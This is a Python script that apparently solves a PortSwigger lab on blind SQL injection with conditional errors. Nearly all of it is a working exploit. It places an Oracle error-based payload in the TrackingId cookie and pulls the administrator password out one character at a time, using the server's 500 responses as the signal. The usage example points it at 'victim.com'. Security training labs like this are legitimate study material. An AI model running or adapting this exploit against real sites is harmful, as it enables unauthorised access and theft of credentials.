# https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors

import urllib3
import urllib
import sys
import requests

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def blind_sqli(url):
    password_extracted = ""

    # Loop through each position in the password (assuming it's up to 20 characters long)
    for i in range(1, 21):

        # Loop through ASCII values of printable characters (40 to 126) - https://theasciicode.com.ar/
        # From 40 (instead of 32) to avoid the character ' that would cause a syntax error
        for j in range(40, 127):

            # Construct SQL injection payload
            # If the first expression is true, error 500 will be raised
            sqli_payload = "'||(SELECT CASE WHEN SUBSTR(password,%s,1)='%s' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'" % (i, chr(j))

            # URL-encode the payload
            sqli_payload_encoded = urllib.parse.quote(sqli_payload)

            # Set up cookies with the injected payload
            cookies = {'TrackingId': 'ZeyZGME2cgit4CQ1' + sqli_payload_encoded, 'session': '0hEfZqWEKiCENY1tOqhVeUOnF8AQK2Xz'}

            # Send the HTTP request to the target URL with the payload
            r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)

            # Check if status response is 200 OK
            if r:
                sys.stdout.write('\r' + password_extracted + chr(j))
                sys.stdout.flush()
            else:
                # If the correct character is found (status 500), append it to the extracted password
                password_extracted += chr(j)
                sys.stdout.write('\r' + password_extracted)
                sys.stdout.flush()
                break  # Move on to the next character in the password

def main():
    if len(sys.argv) != 2:
        print("Usage: %s <URL>" % sys.argv[0])
        print("Example: %s https://victim.com" % sys.argv[0])

    url = sys.argv[1]
    print("Retrieving administrador password...")
    blind_sqli(url)

if __name__ == "__main__":
    main()
